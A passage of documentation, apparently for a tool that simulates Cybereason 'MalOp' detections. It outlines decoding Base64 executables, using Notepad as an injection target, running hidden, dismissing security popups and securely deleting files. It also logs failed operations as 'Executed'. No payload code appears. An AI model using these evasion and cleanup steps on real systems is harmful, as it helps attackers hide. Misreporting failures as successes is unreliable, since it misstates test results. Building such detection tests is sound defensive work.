- Total max wait: 10 seconds

Why retries are needed: Temporary executables may be held by the OS or antivirus scanning. The retry mechanism allows file locks to release.

```
$attempts = 0
$maxAttempts = 5
while ($attempts -lt $maxAttempts) {
    try {
        Remove-Item $filePath -Force
        break  # Success
    } catch {
        $attempts++
        Start-Sleep -Seconds 2
    }
}

​
```

---

#### Timeout Mechanisms

Operation
	
Timeout
	
Fallback Action

VPP MalOp process execution
	
10 seconds
	
Force-stop process with Stop-Process -Force

VFP MalOp process execution
	
10 seconds
	
Force-stop process with Stop-Process -Force

---

#### Process Management

##### VPP MalOp Process Lifecycle

The VPP MalOp has the most complex process management:

```
flowchart TD
    A["Decode Base64 executable"] --> B["Generate GUID filename"]
    B --> C["Write executable to disk"]
    C --> D["Start Notepad (injection target)"]
    D --> E["Launch executable hidden + PassThru"]
    E --> F["Check for Cybereason popup"]
    F --> G{"Popup found?"}
    G -->|"Yes"| H["Close popup window"]
    G -->|"No"| I["Wait 3 seconds"]
    H --> I
    I --> J{"Process exited within 10s?"}
    J -->|"Yes"| K["Proceed to cleanup"]
    J -->|"No"| L["Force-stop process"]
    L --> K
    K --> M["Delete executable (retry x5)"]
    M --> N["Log results"]

Decode Base64 executable

Generate GUID filename

Write executable to disk

Start Notepad (injection target)

Launch executable hidden + PassThru

Check for Cybereason popup

Popup found?

Close popup window

Wait 3 seconds

Process exited within 10s?

Proceed to cleanup

Force-stop process

Delete executable (retry x5)

Log results

Yes

No

Yes

No

​
```

##### VFP MalOp Process Lifecycle

Simpler than VPP:
1. Decode Base64 executable to GUID-named file
1. Execute in hidden mode
1. Overwrite file with random data (secure deletion)
1. Delete executable with retry mechanism
1. Log results

##### Key Process Management Techniques

<details><summary>Hidden Execution</summary>

</details>

<details><summary>PassThru Capture</summary>

</details>

<details><summary>GUID-Based Filenames</summary>

</details>

<details><summary>Popup Window Detection</summary>

</details>

<details><summary>Secure File Cleanup (VFP)</summary>

</details>

---

#### Graceful Degradation

The tool continues operating even when individual components fail:

Failure Scenario
	
Behavior

Individual MalOp command fails
	
Error silently caught, MalOp logs as "Executed" — other MalOps unaffected

Notepad fails to start (VPP)
	
Continues with execution, logs the issue in verbose mode

File deletion fails after 5 retries
	
Logged, execution still marked as complete

Process hangs past timeout
	
Force-terminated, execution continues

Service not found (Cybereason)
	
Error caught silently, MalOp logs as executed

Network connection fails
	
Error caught silently, MalOp logs as executed

---

#### Logged Error Information

When errors do surface in the unified log (infrastructure-level failures):
- Timestamp — exact time of failure
- Operation name — which MalOp was affected
- Error message — exception details from PowerShell
- Marker — ERROR in prefix for easy regex searching via the [Q] query feature
